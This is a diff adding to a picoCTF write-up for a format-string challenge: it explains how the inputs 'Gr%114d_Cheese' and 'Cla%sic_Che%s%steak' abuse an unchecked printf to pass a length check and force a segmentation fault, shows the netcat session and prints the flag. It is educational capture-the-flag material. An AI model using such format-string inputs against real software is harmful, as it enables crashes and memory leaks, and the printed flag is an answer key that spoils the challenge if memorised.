@@ -36,6 +36,8 @@ PicoCTF Challenge:
 $ nc mimas.picoctf.net 60589
 ```
 
+There are two different methods to solve this challenge.
+
 ## Decompile
 
 We can decompile the binary to a pseudo C like this (Binary Ninja):
@@ -252,6 +254,38 @@ int main()
     return 0;
 }
 ```
+
+A close inspection of the program’s decompiled code reveals that special characters with `%` are printed in `printf()`. By selecting an appropriate format string as input, you can have that format string printed and cause a segmentation fault.
+
+The string `Gr%114d_Cheese` prints a specific number of spaces on the screen, followed by additional strings. The code below calls serve_bob if the number of characters printed by printf exceeds 64.
+
+```c
+if (printf(&format) > 0x40) /* 0x40 => 64 */  
+    return serve_bob();
+```
+
+The string `Cla%sic_Che%s%steak` calls `%s` a total of 3 times. In the `printf()` statement containing this string, `%s` is called 6 times in total to print the string. By attempting to call 3 additional non-existent strings, a **segmentation fault** is triggered.
+
+```bash
+therustymate-picoctf@webshell:~$ nc mimas.picoctf.net 60589
+Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
+Here comes the first customer Patrick who wants a giant bite.
+Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
+Enter your recommendation: Gr%114d_Cheese
+Gr                                                                                                           4202954_Cheese
+Good job! Patrick is happy! Now can you serve the second customer?
+Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
+Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
+Enter your recommendation: Cla%sic_Che%s%steak
+ClaCla%sic_Che%s%steakic_Che(null)
+picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}
+
+therustymate-picoctf@webshell:~$ 
+```
+
+The flag is: `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}`
+
+---
 
 This program has a system that reads the flag from flag.txt and outputs it if a segmentation fault occurs.
 Therefore, you can obtain the flag by causing a segmentation fault in the program.
